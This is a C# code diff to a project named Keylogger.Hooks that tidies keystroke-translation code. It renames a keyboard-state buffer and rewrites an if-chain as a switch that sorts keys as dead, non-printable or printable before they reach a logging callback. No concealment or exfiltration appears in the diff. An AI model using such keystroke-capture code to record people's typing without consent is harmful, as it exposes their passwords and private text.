@@ -14,7 +14,7 @@ namespace Keylogger.Hooks
 
         public static Action<string, string, KeyType>? LogKeyCallback;
         public static Predicate<KeyboardMessage>? SelectedKeyboardEventPredicate;
-        private static readonly byte[] _keyboardState = new byte[256];
+        private static readonly byte[] KeyboardState = new byte[256];
 
         private static KeyType KeyType { get; set; }
 
@@ -34,7 +34,7 @@ namespace Keylogger.Hooks
 
         private static string GetKeyName(uint vkCode)
         {
-            if (!GetKeyboardState(_keyboardState))
+            if (!GetKeyboardState(KeyboardState))
             {
                 Debug.WriteLine($"Error getting the keyboard state: {GetLastErrorMessage()}");
                 return "Unknown key";
@@ -43,24 +43,23 @@ namespace Keylogger.Hooks
             var scanCode = MapVirtualKeyW(vkCode, 0);
             var keyName = new char[16];
             var currentKeyboardLayout = GetKeyboardLayout(0);
-            var result = ToUnicodeEx(vkCode, scanCode, _keyboardState, keyName, keyName.Length, 0, currentKeyboardLayout);
+            var result = ToUnicodeEx(vkCode, scanCode, KeyboardState, keyName, keyName.Length, 0, currentKeyboardLayout);
 
-            // The specified virtual key is a dead key character (accent or diacritic).
-            if (result < 0)
+            switch (result)
             {
-                KeyType = KeyType.DeadKey;
-                return $"{new string(keyName, 0, -result)}";
+                // The specified virtual key is a dead key character (accent or diacritic).
+                case < 0:
+                    KeyType = KeyType.DeadKey;
+                    return $"{new string(keyName, 0, -result)}";
+                // The specified virtual key has no translation for the current state of the keyboard.
+                case 0:
+                case > 0 when IsNonPrintableKey(vkCode):
+                    KeyType = KeyType.NonPrintableKey;
+                    return $"[{GetVirtualKeyName(vkCode)}]";
+                default:
+                    KeyType = KeyType.PrintableKey;
+                    return new string(keyName, 0, result);
             }
-
-            // The specified virtual key has no translation for the current state of the keyboard.
-            if (result == 0 || result > 0 && IsNonPrintableKey(vkCode))
-            {
-                KeyType = KeyType.NonPrintableKey;
-                return $"[{GetVirtualKeyName(vkCode)}]";
-            }
-
-            KeyType = KeyType.PrintableKey;
-            return new string(keyName, 0, result);
         }
     }
 }
